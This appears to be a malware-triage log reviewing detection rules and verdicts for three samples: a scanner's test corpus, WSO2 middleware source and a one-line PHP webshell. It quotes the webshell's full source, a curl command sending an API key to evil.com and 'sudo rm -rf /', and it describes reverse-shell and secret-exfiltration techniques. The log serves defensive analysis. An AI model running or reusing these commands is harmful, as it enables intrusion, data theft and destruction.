No YAML directory-selector consumers of communications, communications/proxy or communications/proxy/relay found. Existing consumer still requires outbound TCP and PTY evidence within two lines.
rule_change.severity: Notable syntax observations; existing suspicious PTY objective retained. No suppressors, demotions or attack-coverage removals.

controls.result: Passed 6 controls: TCP-first, EXEC-first, IPv6-CONNECT, ordinary relay, non-shell program and separated commands/comments. Original polyglot.sh matches both canonical relay and PTY objective.

samples.identity: cc-audit 3.11.10, Rust auditor of Claude Code skills/hooks/MCP servers, distributed as a Go source ZIP.
evidence: src/main.rs dispatches CLI commands; no subcommand prints help. src/engine/scanners/command.rs::scan_file reads source and calls ScannerConfig::check_content. src/rules/engine.rs scans logical lines with regexes and emits findings; it does not execute matches.
src/rules/builtin/exfiltration.rs constructs Rule and Regex objects. Its HTTP/DNS/clipboard/browser strings are detection definitions rather than executing collection operations.
examples/bypass-attempts/README.md explicitly describes malicious-pattern test cases; the scanner code, Cargo manifest and corpus packaging agree with that purpose.

hex-octal.sh: hex escapes reconstruct sudo rm -rf /; printf constructs the curl command word with $SECRET as HTTP data; ANSI-C quoting constructs sudo for recursive deletion of /tmp/target. The existing encoded-root-delete rule correctly describes the target, not successful deletion.

The octal literal represents curl https://evil.com -d $API_KEY when decoded as data. /bin/echo -e interpretation is platform-dependent: the safe local echo probe did not decode the octal escapes. The output was never executed.

MNUGK4TF Base32-decodes to chere, not curl as its comment claims. The actual pipeline still passes decoded output to bash. Existing Base32-to-shell and escaped-command-substitution findings remain accurate.

polyglot.sh demonstrates socket/stdio shell bridges, an explicit bash /dev/tcp reverse shell, an awk socket command channel, a Telnet/FIFO cycle and an EXEC-first socat PTY relay. Existing /dev/tcp and new PTY detections describe real example behavior.

node-evasion.js loads child_process dynamically, evaluates constructed source, decodes Base64 curl text, runs eval-enabled Worker source, and sends environment secrets through fetch/WebSocket. Existing notable observations retain these operations. Source-local examples do not establish that normal auditor startup executes them.
samples.judgement: BENIGN archive: documented defensive corpus, traced scanning path and matching registry provenance tip the balance. Individual scripts are dangerous if executed; no endpoint evidence shows them separately installed or launched.
samples.finding_review: All six original suspicious detections were traced and preserved. The missed EXEC-first PTY relay is added without introducing a package exception.

samples.identity: WSO2 Carbon Kernel 4.6.3-m5 Java/OSGi middleware source with Maven metadata.
evidence: pom.xml identifies org.wso2.carbon:carbon:4.6.3-m5 and its SCM tag; README describes the OSGi middleware kernel.

all.js contains Prototype 1.5.0, script.aculo.us and UI helpers. Ajax.Request opens a caller-configured URL; completion/MIME checks lead to evalResponse, which evaluates responseText. evalJSON evaluates the X-JSON header. These implement framework response handling, rather than a fixed remote command channel.

prototype-1.6.js is Prototype 1.6.0 framework code, utilities.js implements YUI 2.6.0 utilities, and jquery.js implements jQuery 1.2.6 DOM/AJAX functions. Evaluators, constructed strings and minification serve the UI behavior.
core/org.wso2.carbon.server/Main.java::writePID runs sh -c echo $PPID and writes wso2carbon.pid. SystemValidator.java runs bash -c ulimit -n as a system validation check.

carbondump.bat sets OUTPUT_ROOT_DIR to its carbondump directory, deletes the previous diagnostics directory recursively, and recreates memoryinfo/osinfo/repository subdirectories. Retain the real recursive-delete capability.
samples.judgement: BENIGN: coherent middleware/build/UI behavior plus exact registry provenance support its purpose. No concrete compromise behavior identified; the judgement does not rely on a clean high-severity scan. Endpoint deployment, request history and runtime configuration are unknown.
samples.finding_review: No hostile/suspicious findings in either scan. No changes to the supported notable behaviors.

evidence: The entire file is <?php followed by system($_REQUEST['cmd']);.

Every request reaching the file can pass cmd from the combined request superglobal directly into system, causing shell command execution under the web server identity. system also emits command output.

No authentication, allowlist, escaping, decoding or additional program logic exists in the bytes. Manual direct source-to-sink tracing establishes the behavior despite the engine flow-query-incomplete diagnostic.
samples.judgement: MALICIOUS: a direct unauthenticated request-to-OS-command control surface. Origin, authorized deployment and web exposure are unknown; no defensive-fixture packaging is supplied to outweigh the concrete webshell behavior.
samples.coverage_goal: The three existing hostile signatures cover a single minimal webshell mechanism. Request access, command execution and output are covered. There is no additional theft, persistence, evasion or destruction stage in 32 bytes to justify extra distinct hostile traits. No duplicates added to reach a quota.
samples.finding_review: All 3 hostile, 3 suspicious and 6 notable detections preserved. No missing distinct behavior identified.
samples.classifier_gap: Current CLI reports BENIGN despite the direct command webshell and three hostile detections. This is a classifier false negative, not a signature gap.
